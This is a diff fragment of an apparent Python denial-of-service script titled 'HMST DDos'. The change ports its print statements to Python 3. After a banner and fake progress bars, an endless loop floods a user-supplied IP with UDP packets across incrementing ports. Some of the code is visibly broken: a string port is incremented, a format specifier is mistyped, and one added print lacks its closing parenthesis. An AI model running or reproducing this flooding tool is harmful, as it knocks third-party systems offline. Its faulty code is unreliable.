@@ -28,19 +28,19 @@ port  = input("Enter Port   :")
 
 os.system("clear")
 os.system("figlet HMST DDos Está Trabalhando Nisso <3")
-print "[+]--xxxx>                           [+]0% "
+print ("[+]--xxxx>                           [+]0% ")
 time.sleep(2)
-print "[+]-- xxxxxxx>                          [+]25% "
+print ("[+]-- xxxxxxx>                          [+]25% ")
 time.sleep(2)
-print "[+]--xxxxxxxxx>                          [+]50% "
+print ("[+]--xxxxxxxxx>                          [+]50% ")
 time.sleep(3)
-print "[+]--xxxxxxxxxxxxxx>                          [+]75% "
-print "[+]--xxxxxxxxxxxxxx>                           [+]100% "
+print ("[+]--xxxxxxxxxxxxxx>                          [+]75% ")
+print ("[+]--xxxxxxxxxxxxxx>                           [+]100% ")
 time.sleep(2)
 sent = 0
 while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
-    print "HamsterNoBlackHat :-Sent %s packet to s% throught port:%s"%(sent,ip,port)
+    print ("HamsterNoBlackHat :-Sent %s packet to s% throught port:%s"%(sent,ip,port)
     if port == 65534
